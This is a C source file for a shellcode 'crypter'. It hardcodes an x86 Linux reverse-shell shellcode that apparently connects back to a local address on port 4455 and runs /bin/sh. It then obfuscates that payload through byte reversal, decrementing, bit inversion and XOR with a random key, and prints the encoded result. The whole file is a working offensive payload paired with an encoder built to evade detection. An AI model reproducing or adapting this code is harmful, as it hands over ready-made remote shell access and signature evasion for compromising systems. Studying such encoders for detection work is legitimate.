/*
BytesKitchen Crypter
Written By Hussien Yousef
IDEA: shellcode -> string --> reverse string --> integer --> -1 --> Reverse all the bits (XOR with 1) --> prepend encrypted "YES" to shellcode (key = 1 byte random) -> encrypt shellcode with XOR key
NOTE: Shellcode must have no null bytes
*/

#include <stdio.h>
#include <time.h>
// enter your shellcode here - to be encrypted
unsigned char shellcode[] = \
"\x31\xc0\x50\xb0\x66\x31\xdb\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x31\xd2\xb2\x66\x92\x31\xdb\x6a\x1\x88\x5c\x24\xff\x88\x5c\x24\xfe\xc6\x44\x24\xfd\x7f\x83\xec\x03\x66\x68\x11\x67\xb3\x03\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x89\xd3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\xeb\x0b\x5b\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main(){

	int shellcode_size = sizeof(shellcode)-1;
	unsigned char tag[3] = {'Y','E','S'};

	// reverse the string
	unsigned char *start_ptr = (unsigned char *) shellcode;
	unsigned char *end_ptr = start_ptr + (shellcode_size-1);
	unsigned char temp;
	while(start_ptr != end_ptr && start_ptr < end_ptr){
		temp = *start_ptr;
		*start_ptr = *end_ptr;
		*end_ptr = temp;
		start_ptr++;
		end_ptr--;
	}

	// integer - 1
	int *shell_ptr = (int *) shellcode;
	int rotations = shellcode_size/4;
	for(int itr = 0; itr < rotations; itr++){
		*shell_ptr = *shell_ptr - 1;
		shell_ptr++; // will increase 4 bytes
	}

	// Reverse all the bits
	for(int itr = 0; itr < shellcode_size; itr++){
		shellcode[itr] = shellcode[itr] ^ 0xff;
	}

	// Generate a random 1 byte key
	srand(time(NULL));
	int rr = 255;
	while(rr == 0 || rr == 255){
		rr = rand() % 255;
	}
	unsigned char key = (unsigned char) rr;
	
	// XOR TAG with key
	for(int i =0; i < (sizeof(tag)/sizeof(unsigned char)); i++){
		tag[i] = tag[i] ^ key;
	}
	
	// XOR shellcode with key
	for(int i =0; i < shellcode_size; i++){
		shellcode[i] = shellcode[i] ^ key;
	}

	// print final shellcode {xored tag, encrypted shellcode}
	printf("Your new encrypted shellcode:\n");
	// print tag
	printf("\"\\x%02x\\x%02x\\x%02x", (unsigned int) tag[0], (unsigned int) tag[1], (unsigned int) tag[2]);
	// print shellcode
	for(int i = 0; i < shellcode_size;  i++){
		printf("\\x%02x", (unsigned int) shellcode[i]);
	}
	printf("\"\n");
	return 0;
}
